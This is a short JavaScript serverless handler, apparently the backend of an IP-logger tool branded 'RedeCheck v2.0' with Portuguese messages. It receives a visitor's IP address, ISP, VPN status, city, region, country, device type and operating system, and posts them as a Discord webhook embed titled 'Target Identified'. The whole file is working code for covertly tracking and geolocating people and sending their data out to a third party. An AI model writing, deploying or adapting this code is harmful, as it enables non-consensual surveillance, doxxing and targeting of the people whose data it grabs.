export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      error: "Method Not Allowed"
    });
  }

  const webhook = process.env.DISCORD_WEBHOOK_URL;

    if (!webhook) {
    return res.status(500).json({
      error: "DISCORD_WEBHOOK_URL não configurada"
    });
  }

  try {
    const data = req.body;
    console.log('Dados recebidos:', data);

    const embed = {
      title: "🎯 Alvo Identificado",
      color: 16711680,
      fields: [
        { name: "🌐 IP", value: data.ip, inline: true },
        { name: "🏢 ISP", value: data.isp, inline: true },
        { name: "🛡️ VPN", value: data.vpn, inline: true },
        { name: "📍 Local", value: `${data.city}, ${data.region}\n${data.country}`, inline: false },
        { name: "📱 Device", value: `${data.deviceType} / ${data.os}`, inline: true }
      ],
      footer: { text: "RedeCheck v2.0 – Vercel" },
      timestamp: new Date().toISOString()
    };

    await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    console.log("✅ Dados enviados ao Discord");

    return res.status(200).json({
      status: "ok"
    });
  } catch (err) {
    console.error("Erro:", err);

    return res.status(500).json({
      error: "Internal Server Error"
    });
  }
}
